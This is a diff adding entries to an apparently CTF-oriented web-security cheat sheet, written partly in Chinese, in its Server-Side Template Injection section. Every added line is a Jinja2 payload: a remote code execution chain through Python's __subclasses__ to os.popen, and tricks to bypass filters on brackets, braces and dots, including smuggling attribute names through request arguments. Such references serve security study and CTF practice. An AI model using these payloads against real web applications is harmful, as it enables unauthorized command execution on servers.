@@ -1688,6 +1688,23 @@ Server-Side Template Injection
         - load config
     - `{{ config['RUNCMD']('cat flag',shell=True) }}`
 
+- RCE (another way)
+        - `{{''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('ls').read()}}`
+- 過濾中括號
+    - `__getitem__`
+    - `{{''.__class__.__mro__.__getitem__(2)}}`
+        - `{{''.__class__.__mro__[2]}}`
+- 過濾`{{` or `}}`
+    - 用`{%%}`
+    - 執行結果往外傳
+- 過濾`.`
+    - `{{''.__class__}}`
+        - `{{''['__class__']}}`
+        - `{{''|attr('__class__')}}`
+- 用request繞
+    - `{{''.__class__}}`
+        - `{{''[request.args.kaibro]}}&kaibro=__class__`
+
 ## AngularJS
 - v1.6後移除Sandbox
 - Payload
